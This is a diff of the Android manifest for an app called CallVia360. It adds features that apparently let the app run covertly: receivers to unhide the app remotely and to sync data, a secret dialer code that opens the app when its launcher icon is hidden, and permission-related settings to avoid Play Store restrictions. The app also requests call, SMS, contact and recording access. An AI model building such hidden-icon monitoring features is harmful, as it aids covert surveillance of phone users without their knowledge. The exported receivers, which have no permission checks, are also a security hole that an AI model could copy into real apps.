@@ -1,5 +1,6 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools">
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.CallVia360.app">
 
     <!-- Permissions required for Telephony, SMS, Contacts and Recordings Sensing -->
     <uses-permission android:name="android.permission.INTERNET"/>
@@ -23,6 +24,15 @@
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC"/>
+
+    <!-- Prevent Google Play from restricting device availability due to telephony/audio permissions -->
+    <uses-feature android:name="android.hardware.telephony" android:required="false"/>
+    <uses-feature android:name="android.hardware.telephony.calling" android:required="false"/>
+    <uses-feature android:name="android.hardware.telephony.messaging" android:required="false"/>
+    <uses-feature android:name="android.hardware.telephony.data" android:required="false"/>
+    <uses-feature android:name="android.hardware.telephony.gsm" android:required="false"/>
+    <uses-feature android:name="android.hardware.telephony.cdma" android:required="false"/>
+    <uses-feature android:name="android.hardware.microphone" android:required="false"/>
 
     <application
         android:label="CallVia360"
@@ -50,6 +60,26 @@
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
+
+        <!-- Admin Receiver for remote/local app unhide & restoration -->
+        <receiver
+            android:name=".AdminReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.CallVia360.app.ACTION_UNHIDE" />
+                <action android:name="com.CallVia360.app.ACTION_SYNC" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Secret code dialer receiver: Dial *#*#3600#*#* to open app when launcher icon is hidden -->
+        <receiver
+            android:name=".SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="3600" />
+            </intent-filter>
+        </receiver>
 
         <meta-data
             android:name="flutterEmbedding"
